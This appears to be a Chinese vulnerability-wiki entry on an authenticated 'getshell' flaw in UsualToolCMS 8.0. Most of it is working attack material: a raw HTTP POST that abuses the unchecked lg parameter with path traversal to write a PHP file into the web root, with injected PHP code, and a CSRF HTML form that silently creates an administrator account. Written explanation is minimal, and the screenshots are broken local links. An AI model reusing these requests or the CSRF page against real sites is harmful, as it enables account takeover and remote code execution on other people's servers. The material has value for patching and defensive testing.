UsualToolcms 8.0 后台GETSHELL
=============================

一、漏洞简介
------------

二、漏洞影响
------------

UsualToolCMS-8.0-Release

三、复现过程
------------

洞点:<http://0-sec.org/cmsadmin/a_lang.php>

13行未对\$lg做判断

![](/Users/aresx/Documents/VulWiki/.resource/UsualToolcms8.0后台GETSHELL/media/rId25.png)

![](/Users/aresx/Documents/VulWiki/.resource/UsualToolcms8.0后台GETSHELL/media/rId26.png)

![](/Users/aresx/Documents/VulWiki/.resource/UsualToolcms8.0后台GETSHELL/media/rId27.png)

点击保存时抓包需要修改url处的lg参数这样就上传到跟目录了，再在post
参数的en后面加入

    en"},<?php phpinfo(); ?>

![](/Users/aresx/Documents/VulWiki/.resource/UsualToolcms8.0后台GETSHELL/media/rId28.png)

![](/Users/aresx/Documents/VulWiki/.resource/UsualToolcms8.0后台GETSHELL/media/rId29.png)

![](/Users/aresx/Documents/VulWiki/.resource/UsualToolcms8.0后台GETSHELL/media/rId30.png)

    POST /UsualToolCMS/cmsadmin/a_langx.php?x=m&lg=../1.php HTTP/1.1
    Host: 0-sec.org
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
    Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    DNT: 1
    Referer: http://192.168.235.242/UsualToolCMS/cmsadmin/a_langx.php?lg=lg-en.json
    Cookie: navleft=21; UTCMSLanguage=zh; PHPSESSID=1r5kk3jieflfbnseav3e5dnclo
    X-Forwarded-For: 8.8.8.8
    Connection: close
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 9189

    submit=保存语言包&keys[]=language&values[]=en"},<?php phpinfo(); ?>&keys[]=charset&values[]=utf-8&keys[]=speak&values[]=English&keys[]=web&values[]=UsualToolCMS&key[]=index&value[]=Home&key[]=article&value[]=Article&key[]=product&value[]=Product&key[]=picture&value[]=Picture&key[]=atlas&value[]=Atlas&key[]=contact&value[]=Contact&key[]=about&value[]=About&key[]=forum&value[]=Forum&key[]=register&value[]=Register&key[]=login&value[]=Login&key[]=news&value[]=News&key[]=job&value[]=Job&key[]=wages&value[]=Wages&key[]=application&value[]=Application&key[]=resume&value[]=Resume&key[]=shopcart&value[]=Shopcart&key[]=account&value[]=Account&key[]=member&value[]=Member&key[]=up&value[]=Up&key[]=down&value[]=Down&key[]=more&value[]=More&key[]=new&value[]=New&key[]=authorize&value[]=Authorize&key[]=authenticating&value[]=Authenticating&key[]=qq&value[]=QQ&key[]=membercenter&value[]=Member&key[]=username&value[]=Username&key[]=password&value[]=Password&key[]=forgotpass&value[]=Forgot&key[]=search&value[]=Search&key[]=detail&value[]=Detail&key[]=size&value[]=Size&key[]=spec&value[]=Spec&key[]=color&value[]=Color&key[]=aboutus&value[]=About Us&key[]=newgoods&value[]=New Product&key[]=topgoods&value[]=Top Product&key[]=link&value[]=Link&key[]=confirm&value[]=Confirm&key[]=email&value[]=Email&key[]=title&value[]=Title&key[]=content&value[]=Content&key[]=avatar&value[]=Avatar&key[]=sex&value[]=Sex&key[]=man&value[]=Man&key[]=woman&value[]=Woman&key[]=address&value[]=ADD.&key[]=tel&value[]=Tel&key[]=fax&value[]=Fax&key[]=introduction&value[]=Intro&key[]=validatecode&value[]=Captcha&key[]=changeit&value[]=Change it&key[]=order&value[]=Order&key[]=writeorder&value[]=Write Order&key[]=menu&value[]=Menu&key[]=balance&value[]=Balance&key[]=level&value[]=Level&key[]=writearticles&value[]=Write Articles&key[]=articlemanagement&value[]=Article Admin&key[]=articlebrowse&value[]=Article Browse&key[]=writeonline&value[]=Add New&key[]=payment&value[]=Payment&key[]=registrationtime&value[]=Reg Time&key[]=lastlogintime&value[]=Last Login&key[]=fullname&value[]=Full Name&key[]=privileges:discount&value[]=Privileges:Discount&key[]=state&value[]=State&key[]=source&value[]=Source&key[]=ordernumber&value[]=Order No.&key[]=money&value[]=Money&key[]=time&value[]=Time&key[]=finish&value[]=Finish&key[]=unpaid&value[]=Unpaid&key[]=deliver&value[]=Deliver&key[]=refund&value[]=Refund&key[]=goods&value[]=Goods&key[]=charge&value[]=Charge&key[]=other&value[]=Other&key[]=ordertime&value[]=Order Time&key[]=voucher&value[]=Voucher&key[]=customer&value[]=Customer&key[]=zipcode&value[]=Zip Code&key[]=logistics&value[]=Logistics&key[]=logisticscompany&value[]=Company&key[]=logisticsnumber&value[]=Number&key[]=logisticsdetails&value[]=Details&key[]=paymentmethod&value[]=Method&key[]=alipay&value[]=Alipay&key[]=wechatpay&value[]=Tencent Wechat&key[]=paypal&value[]=Paypal&key[]=waitinganswer&value[]=Waiting&key[]=answered&value[]=Answered&key[]=question&value[]=Question&key[]=reply&value[]=Reply&key[]=tencentaccount&value[]=Tencent&key[]=weiboaccount&value[]=Weibo&key[]=wechataccount&value[]=Wechat&key[]=binded&value[]=Binded&key[]=untie&value[]=Untie&key[]=quantity&value[]=Qty&key[]=parameter&value[]=Parm&key[]=total&value[]=Total&key[]=submit&value[]=Submit&key[]=delete&value[]=Del&key[]=unit&value[]=USD&key[]=actual&value[]=Actual&key[]=feedback&value[]=Feedback&key[]=otheraccount&value[]=Other Accounts&key[]=out&value[]=Out&key[]=ranking&value[]=Ranking&key[]=recommend&value[]=Recommend&key[]=tag&value[]=Tag&key[]=tags&value[]=Tags&key[]=read&value[]=Read&key[]=productdetails&value[]=Product Details&key[]=service&value[]=Service&key[]=category&value[]=Category&key[]=allcategory&value[]=All Category&key[]=stock&value[]=Stock&key[]=price&value[]=Price&key[]=sale&value[]=Sale&key[]=loginview&value[]=Login View&key[]=readme&value[]=Read Me&key[]=popularity&value[]=Popularity&key[]=details&value[]=Details&key[]=message&value[]=Message&key[]=original&value[]=Original&key[]=author&value[]=Author&key[]=pass&value[]=Pass&key[]=audit&value[]=Audit&key[]=return&value[]=Return&key[]=yes&value[]=Yes&key[]=no&value[]=No&key[]=modify&value[]=Modify&key[]=articlemodify&value[]=Article Modify&key[]=type&value[]=Type&key[]=moreupload&value[]=Up to upload&key[]=success&value[]=Success&key[]=fail&value[]=Fail&key[]=upload&value[]=Upload&key[]=uploadtime&value[]=Upload Time&key[]=contactus&value[]=Contact Us&key[]=previouspage&value[]=Prev&key[]=nextpage&value[]=Next&key[]=firstpage&value[]=First&key[]=lastpage&value[]=Last&key[]=totalpage&value[]=Total&key[]=currentpage&value[]=Current&key[]=buy&value[]=Buy&key[]=mailverify&value[]=Email validation&key[]=welcome&value[]=Welcome&key[]=close&value[]=closed&key[]=findpassword&value[]=Find Password&key[]=contactmanager&value[]=Contact Manager&key[]=orderdetaillogin&value[]=For order details,please visit the website.&key[]=enterusername&value[]=Please enter username!&key[]=enterpassword&value[]=Please enter password!&key[]=enteremail&value[]=Please enter Email!&key[]=emailerr&value[]=Email error!&key[]=entertitle&value[]=Please enter title!&key[]=entercontent&value[]=Please enter content!&key[]=selecttype&value[]=Type must be selected!&key[]=enterauthor&value[]=Please enter author!&key[]=enterpasswords&value[]=Please confirm the password!&key[]=passworderr&value[]=The codes don&key[]=entercaptcha&value[]=Please enter captcha!&key[]=captchaerr&value[]=Captcha error!&key[]=mailsenderr&value[]=Mail not sent!&key[]=mailok&value[]=Please check email!&key[]=pleasemailverify&value[]=Please check email for verification!&key[]=mailverifycode&value[]=Email Authentication Code&key[]=mailcopylink&value[]=Please copy the following link&key[]=totalnum&value[]=Total Num&key[]=updateok&value[]=Update successed!&key[]=updateno&value[]=Failed to update!&key[]=payok&value[]=Successful payment!&key[]=payno&value[]=Payment Failed!&key[]=createempty&value[]=Required field is empty!&key[]=createok&value[]=Create successed!&key[]=createno&value[]=Failed to create!&key[]=gotopay&value[]=Go to pay!&key[]=untieok&value[]=Untie successed!&key[]=untieno&value[]=Untie failed!&key[]=delok&value[]=Delete successed!&key[]=delno&value[]=Delete failed!&key[]=regclose&value[]=Website registration closed!&key[]=regmailerr&value[]=Account or email registered!&key[]=loginusererr&value[]=Account does not exist!&key[]=loginpasserr&value[]=Account or password does not match!&key[]=administratorreply&value[]=The administrator has not responded, please wait patiently.&key[]=noscript&value[]=Sorry, your browser disabled JavaScript, it may not be able to use some of the site&key[]=readmecontent&value[]=We guarantee that the outer packing of the goods is in good condition at the time of shipment. When you receive the goods, please carefully check whether the invoice and the goods are consistent with the delivery order. If you find that the goods are missing or damaged, please contact our customer service department on the spot when the delivery personnel are still on the scene; If you find that the package is damaged or the goods are damaged in transit, please point out and refuse to accept it on the spot. After refusal, please call our customer service. If you have signed for it or someone else has signed for it, you will be considered as the packaging, quantity and content of the goods. I will not be able to accept.&key[]=copyright&value[]=Copyright&key[]=cssdisplay&value[]=none&key[]=test&value[]=Test
    请将上面post数据包内容进行url编码

### csrf配合上面的后台getshell

    <html>
      <body>
      <script>history.pushState('', '', '/')</script>
      <form action="http://0-sec.org/cmsadmin/a_adminx.php?x=a" method="POST">
          <input type="hidden" name="username" value="safetest" />
          <input type="hidden" name="roleid" value="1" />
          <input type="hidden" name="password" value="123456" />
          <input type="hidden" name="password&#95;confirm" value="123456" />
          <input type="hidden" name="submit" value="æ&#143;&#144;äº&#164;" />
          <input type="submit" value="Submit request" />
        </form>
      </body>
    </html>

![](/Users/aresx/Documents/VulWiki/.resource/UsualToolcms8.0后台GETSHELL/media/rId32.shtml)
